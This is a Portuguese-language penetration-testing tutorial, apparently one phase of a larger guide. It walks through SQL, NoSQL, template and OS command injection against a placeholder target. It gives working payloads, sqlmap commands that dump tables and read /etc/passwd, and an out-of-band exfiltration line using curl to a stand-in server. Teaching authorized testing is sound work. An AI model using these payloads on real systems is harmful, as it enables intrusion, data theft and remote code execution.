# Fase 3: Testes de Injeção (SQLi, NoSQLi, SSTI, Command Injection)

**Tempo estimado:** 90-120 minutos
**Objetivo:** Testar TODAS as formas de injeção em parâmetros de entrada da aplicação. Injeção é a vulnerabilidade mais devastadora — pode permitir leitura de banco de dados, execução de comandos e takeover completo do servidor.
**Por quê:** Se um parâmetro aceita input do usuário e esse input chega a um banco de dados, template engine ou shell do sistema, existe risco de injeção. Cada parâmetro encontrado na Fase 2 é um candidato.

---

## O que é Injeção?

Imagine que o servidor faz uma pergunta ao banco de dados:

```sql
SELECT * FROM users WHERE id = 'O QUE_O_USUARIO_DIGITOU';
```

Se o servidor coloca o input do usuário **diretamente** nessa query, você pode "injetar" SQL próprio:

```
Input do usuário: 1' OR '1'='1
Query resultante: SELECT * FROM users WHERE id = '1' OR '1'='1';
```

Agora a query retorna TODOS os usuários (porque `1=1` é sempre verdadeiro). Isso é SQL Injection.

**Onde acontece:** Qualquer lugar onde input do usuário chega a um processo sem sanitização:
- Bancos de dados (SQLi, NoSQLi)
- Template engines (SSTI)
- Shell do sistema (Command Injection)

---

## 3A: SQL Injection (SQLi)

### Passo 3A.1 — Teste Básico de SQLi

**O que você vai fazer:** Injetar SQL básico em parâmetros para verificar se a aplicação processa consultas SQL sem sanitização.

**No Burp Repeater:**
1. No HTTP history, encontre um request GET com parâmetro (ex: `/api/users?id=1`)
2. Clique direito → **Send to Repeater**
3. No Repeater, modifique o parâmetro:

```http
GET /api/users?id=1' OR '1'='1 HTTP/1.1
Host: target.com
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
Content-Type: application/json

{"users": [
  {"id": 1, "name": "Admin", "role": "admin"},
  {"id": 2, "name": "User1", "role": "user"},
  {"id": 3, "name": "User2", "role": "user"},
  ...
]}
```

**O que procurar:** A resposta contém MAIS dados do que o request original. Se `?id=1` deveria retornar 1 usuário e retornou vários → vulnerável.

**✅ Output esperado (NÃO vulnerável):**
```
HTTP/1.1 400 Bad Request
{"error": "Invalid input"}
```
ou
```
HTTP/1.1 200 OK
{"users": [{"id": 1, "name": "Admin"}]}
```

Se retornou apenas o usuário original → NÃO vulnerável (neste parâmetro).

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Retorna erro 500 | SQL com sintaxe errada | Tente outros payloads: `1' OR 1=1--`, `1' AND '1'='1` |
| Retorna 403 | WAF bloqueando | Use encoding: `1%27%20OR%20%271%27%3D%271` |
| Retorna 200 mas dados iguais | Parâmetro não é SQL | Tente outros parâmetros da Fase 2 |

---

### Passo 3A.2 — UNION Attack (extrair dados de outras tabelas)

**O que você vai fazer:** Descobrir quantas colunas a query original retorna, depois usar UNION SELECT para extrair dados de outras tabelas.

**Passo 3A.2.1 — Determinar número de colunas:**

```http
GET /api/users?id=1' ORDER BY 1-- HTTP/1.1
Host: target.com
```

Aumente o número até receber erro:
```http
GET /api/users?id=1' ORDER BY 5-- HTTP/1.1
Host: target.com
```

Se `ORDER BY 5` retorna erro mas `ORDER BY 4` funciona → a query tem **4 colunas**.

**Passo 3A.2.2 — Confirmar com UNION SELECT NULL:**

```http
GET /api/users?id=1' UNION SELECT NULL,NULL,NULL,NULL-- HTTP/1.1
Host: target.com
```

Se retornar 200 OK (sem erro) → número de colunas está correto.

**Passo 3A.2.3 — Extrair dados:**

```http
GET /api/users?id=-1' UNION SELECT username,password,NULL,NULL FROM users-- HTTP/1.1
Host: target.com
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
{"users": [
  {"username": "admin", "password": "5f4dcc3b5aa765d61d8327deb882cf99"},
  {"username": "user1", "password": "25d55ad283aa400af464c76d713c07ad"}
]}
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| UNION retorna erro | Número de colunas errado | Teste com mais/menos NULLs |
| UNION retorna dados vazios | Colunas incompatíveis | Troque NULL por string: `UNION SELECT 'a',NULL,NULL,NULL--` |
| WAF bloqueia UNION |过滤关键字 | Use case insensitive: `uNiOn SeLeCt` |

---

### Passo 3A.3 — Confirmar com SQLMap

**O que vai fazer:** Usar o SQLMap para automatizar a confirmação e exploração da SQLi.

**Passo 3A.3.1 — Instalar SQLMap:**

```bash
sudo apt install sqlmap -y
```

**Verificar instalação:**
```bash
sqlmap --version
```

**✅ Output esperado:**
```
sqlmap 1.8.x
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| `sqlmap: command not found` | Não instalado | `sudo apt install sqlmap -y` |
| Versão antiga | Repositório desatualizado | `sudo apt update && sudo apt install sqlmap -y` |

**Passo 3A.3.2 — Testar URL do Burp HTTP history:**

```bash
sqlmap -u "https://target.com/api/users?id=1" --batch --risk=2 --level=3
```

**Explicação das flags:**
| Flag | Função |
|------|--------|
| `-u "URL"` | URL alvo para testar |
| `--batch` | Responde automaticamente "yes" a todas as perguntas |
| `--risk=2` | Usa testes mais agressivos (nível 1=seguro, 3=todos) |
| `--level=3` | Testa mais parâmetros e payloads (nível 1=básico, 5=todos) |

**✅ Output esperado (VULNERÁVEL — trecho principal):**
```
[INFO] testing connection to the target URL
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] testing 'MySQL >= 5.0 AND error-based'
[INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
```

**O que procurar:**
- **`the back-end DBMS is MySQL`** → confirmou SQLi e identificou o banco
- **`AND time-based blind`** → SQLi por timing funcionou

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| `not injectable` | Parâmetro não é vulnerável | Teste outros parâmetros ou use `--level=5 --risk=3` |
| Rate limiting | WAF bloqueando | Adicione delay: `--delay=1` |
| `connection reset` | WAF ou firewall | Use `--random-agent` e `--proxy=http://127.0.0.1:8080` |
| Muito lento | Muitos payloads | Use apenas `--technique=BEU` (Boolean, Error, Union) |

**Passo 3A.3.3 — Enumerar databases:**

```bash
sqlmap -u "https://target.com/api/users?id=1" --batch --dbs
```

**✅ Output esperado:**
```
available databases [3]:
[*] information_schema
[*] mysql
[*] targetdb
```

**Passo 3A.3.4 — Enumerar tabelas de um database:**

```bash
sqlmap -u "https://target.com/api/users?id=1" --batch -D targetdb --tables
```

**✅ Output esperado:**
```
Database: targetdb
[5 tables]
+-----------+
| users     |
| products  |
| orders    |
| sessions  |
| config    |
+-----------+
```

**Passo 3A.3.5 — Dump de uma tabela:**

```bash
sqlmap -u "https://target.com/api/users?id=1" --batch -D targetdb -T users --dump
```

**✅ Output esperado:**
```
Database: targetdb
Table: users
[3 entries]
+----+----------+---------------------------------------------+-------+
| id | username | password                                    | role  |
+----+----------+---------------------------------------------+-------+
| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 (md5:pass) | admin |
| 2  | user1    | 25d55ad283aa400af464c76d713c07ad (md5:123456)| user  |
| 3  | user2    | e10adc3949ba59abbe56e057f20f883e (md5:123456)| user  |
+----+----------+---------------------------------------------+-------+
```

**Passo 3A.3.6 — Ler arquivo do servidor (se suportado):**

```bash
sqlmap -u "https://target.com/api/users?id=1" --batch --file-read=/etc/passwd
```

**✅ Output esperado (VULNERÁVEL):**
```
[INFO] the file you want to read is readable
[INFO] retrieving the content of the file '/etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**⚠️ ATENÇÃO:** `--file-read` funciona apenas em MySQL com privilégios FILE e quando o servidor tem permissão de leitura.

---

### Passo 3A.4 — SQLi em Headers

**O que você vai fazer:** Testar SQLi em headers HTTP que são usados em queries SQL (comum em aplicações que logam IP ou usam Referer em queries).

```http
GET /api/users HTTP/1.1
Host: target.com
X-Forwarded-For: 1' OR '1'='1
User-Agent: ' OR '1'='1
Referer: ' OR '1'='1
```

**Como testar:**
1. No Burp Repeater, adicione cada header com payload SQL
2. Envie individualmente (não todos de uma vez)
3. Verifique se a resposta muda

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Todos retornam 200 igual | Headers não são processados em SQL | Tente parâmetros POST/GET |
| WAF bloqueia payloads | Filtro de headers | Use encoding: `%27%20OR%20%271%27%3D%271` |

---

### Passo 3A.5 — Blind SQLi

**O que você vai fazer:** Testar SQLi quando a aplicação NÃO retorna dados do banco — apenas retorna "sim" ou "não".

**Passo 3A.5.1 — Teste Boolean:**

```http
GET /api/users?id=1' AND 1=1-- HTTP/1.1
Host: target.com
```

```http
GET /api/users?id=1' AND 1=2-- HTTP/1.1
Host: target.com
```

**Se a primeira retorna dados e a segunda NÃO retorna → VULNERÁVEL a blind SQLi.**

**Passo 3A.5.2 — Time-based Blind:**

```http
GET /api/users?id=1' AND SLEEP(5)-- HTTP/1.1
Host: target.com
```

Se o servidor demora 5 segundos para responder → VULNERÁVEL.

**Passo 3A.5.3 — Extrair dados com Blind SQLi:**

```http
GET /api/users?id=1' AND SUBSTRING((SELECT database()),1,1)='a'-- HTTP/1.1
Host: target.com
```

Se retornar dados → a primeira letra do database é 'a'. Repita para cada posição.

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| SLEEP não funciona | MySQL com thread_pool | Use `BENCHMARK(10000000,SHA1('test'))` |
| Boolean não funciona | Resposta sempre igual | Verifique se o HTML muda (use diff) |
| Muito lento | Muitas iterações | Use `sqlmap --technique=T --time-sec=2` |

---

## 3B: NoSQL Injection

### Passo 3B.1 — Teste Básico MongoDB

**O que você vai fazer:** Testar injeção em bancos NoSQL (MongoDB, CouchDB) usando operadores de comparação.

```http
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "username": {"$gt": ""},
  "password": {"$gt": ""}
}
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
{"token": "eyJhbGciOiJIUzI1NiIs..."}
```

**O que procurar:** O `$gt` (greater than) retorna todos os documentos onde o valor é maior que string vazia — ou seja, TODOS os usuários. Se retornou um token → bypass de autenticação.

### Passo 3B.2 — NoSQLi via URL Parameter

```http
GET /api/users?filter[$ne]= HTTP/1.1
Host: target.com
```

O `$ne` (not equal) retorna todos os documentos onde o valor NÃO é igual a vazio.

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Retorna erro 400 | JSON não aceito em GET | Use POST com Content-Type: application/json |
| `$gt` não funciona | Input sanitizado | Tente `$regex`, `$exists`, `$nin` |
| App não usa MongoDB | É SQL ou outro NoSQL | Volte para seção SQLi |

---

## 3C: Server-Side Template Injection (SSTI)

### Passo 3C.1 — Teste Básico SSTI

**O que você vai fazer:** Verificar se a aplicação processa templates Jinja2, Twig ou Freemarker.

```http
GET /api/render?name={{7*7}} HTTP/1.1
Host: target.com
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
{"rendered": "49"}
```

**Se retornou `49` → O template está processando expressões matemáticas → VULNERÁVEL.**

**✅ Output esperado (NÃO vulnerável):**
```
HTTP/1.1 200 OK
{"rendered": "{{7*7}}"}
```

Se retornou o literal `{{7*7}}` → NÃO vulnerável.

### Passo 3C.2 — Identificar Template Engine

```http
GET /api/render?name={{7*'7'}} HTTP/1.1
Host: target.com
```

| Output | Engine | Linguagem |
|--------|--------|-----------|
| `49` | Jinja2 ou Twig | Python ou PHP |
| `7777777` | Jinja2 | Python (concatenação de string) |
| `49` | Twig | PHP |
| `{{7*'7'}}` (literal) | Velocity, Freemarker | Java (não vulnerável) |

### Passo 3C.3 — Exfiltrar Dados (Jinja2)

```http
GET /api/render?name={{config.items()}} HTTP/1.1
Host: target.com
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
{"rendered": "[('SECRET_KEY', 'abc123'), ('DATABASE_URI', 'mysql://...'), ...]"}
```

**O que procurar:** Variáveis de configuração sensíveis como SECRET_KEY, DATABASE_URI, API keys.

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| `{{7*7}}` retorna literal | Template engine com sandbox | Tente `{{config}}` ou `{{self}}` |
| Erro 500 | Payload causa exception | Use payloads mais simples: `{{7*7}}` primeiro |
| Não é template injection | Input não chega a template | Verifique se o parâmetro é usado em render |

---

## 3D: OS Command Injection

### Passo 3D.1 — Teste Básico

**O que você vai fazer:** Verificar se a aplicação executa comandos do sistema operacional com input do usuário.

```http
GET /api/ping?host=127.0.0.1;id HTTP/1.1
Host: target.com
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
{"result": "PING 127.0.0.1 (127.0.0.1): 56 data bytes\n64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.049 ms\n\nuid=33(www-data) gid=33(www-data) groups=33(www-data)"}
```

**O que procurar:** O output do comando `id` apareceu junto com o output do `ping` → **RCE confirmado.**

### Passo 3D.2 — Outros Separadores

```http
GET /api/ping?host=127.0.0.1|id HTTP/1.1
GET /api/ping?host=127.0.0.1||id HTTP/1.1
GET /api/ping?host=127.0.0.1&&id HTTP/1.1
GET /api/ping?host=`id` HTTP/1.1
GET /api/ping?host=$(id) HTTP/1.1
```

Teste TODOS os separadores. Se `;` não funcionar, tente `|`, `||`, `&&`, `` ` ``, `$()`.

### Passo 3D.3 — Exfiltrar Dados

```http
GET /api/ping?host=127.0.0.1;cat+/etc/passwd HTTP/1.1
Host: target.com
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
{"result": "PING 127.0.0.1: 56 data bytes\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n..."}
```

**O que procurar:** Conteúdo do `/etc/passwd` → confirma que você pode ler arquivos do sistema.

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Nenhum separador funciona | WAF ou filtro de input | Use encoding: `%3B` para `;`, `%7C` para `|` |
| Comando não executa | App usa exec() seguro | Teste com `$(sleep 5)` para time-based |
| Saída não aparece | Blind command injection | Use out-of-band: `curl http://SEU-SERVIDOR/?data=$(whoami)` |

---

## Checklist de Injeção

| # | Item | Arquivo gerado | ☑ |
|---|------|---------------|:---:|
| 1 | SQLi testado em parâmetros GET | `relatorio/sqli-test.txt` | [ ] |
| 2 | UNION attack executado | `relatorio/sqli-union.txt` | [ ] |
| 3 | SQLMap executado | `relatorio/sqlmap-results.txt` | [ ] |
| 4 | SQLMap databases enumerados | `relatorio/sqlmap-dbs.txt` | [ ] |
| 5 | SQLi testado em headers | `relatorio/sqli-headers.txt` | [ ] |
| 6 | Blind SQLi testado | `relatorio/blind-sqli.txt` | [ ] |
| 7 | NoSQLi testado (se aplicável) | `relatorio/nosqli.txt` | [ ] |
| 8 | SSTI testado | `relatorio/ssti.txt` | [ ] |
| 9 | Command Injection testado | `relatorio/cmdi.txt` | [ ] |

### ✅ Sinal de sucesso:
- Pelo menos **uma injeção confirmada** (SQLi, NoSQLi, SSTI ou Command Injection)
- **Dados exfiltrados** com sucesso (SQLMap dump ou manual)
- **Payloads documentados** para reprodução

### ❌ Se falhou:
- Se NENHUMA injeção funcionou → pode ser que o alvo seja seguro nestes vetores
- Teste outros parâmetros encontrados na Fase 2
- O mínimo para avançar: ter testado pelo menos 5 parâmetros diferentes com payloads básicos

### 🔗 O que deste arquivo alimenta nas próximas fases:
| Arquivo da Fase 3 | Usado na Fase | Para quê |
|--------------------|---------------|----------|
| `sqli-test.txt` | Fase 11 (Validação) | Confirmar exploit reproduzível |
| `sqlmap-results.txt` | Fase 12 (Relatório) | Documentar dados exfiltrados |
| `cmdi.txt` | Fase 11 (Validação) | Confirmar RCE |
| `ssti.txt` | Fase 12 (Relatório) | Documentar template injection |

**Se completou tudo → Avance para Fase 4** (`04-cliente.md`)

---

## Mini-Checkpoint: Teste SQLi em um Lab

Antes de avançar, execute SQLi em um lab real para praticar:

1. Acesse o lab "SQL injection vulnerability in WHERE clause" no PortSwigger: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
2. Use Burp Repeater para testar `' OR 1=1--`
3. Confirme que retornou dados extras
4. Tente UNION SELECT para extrair dados de outras tabelas

Se conseguiu resolver o lab → avance. Se não → revise os passos acima.
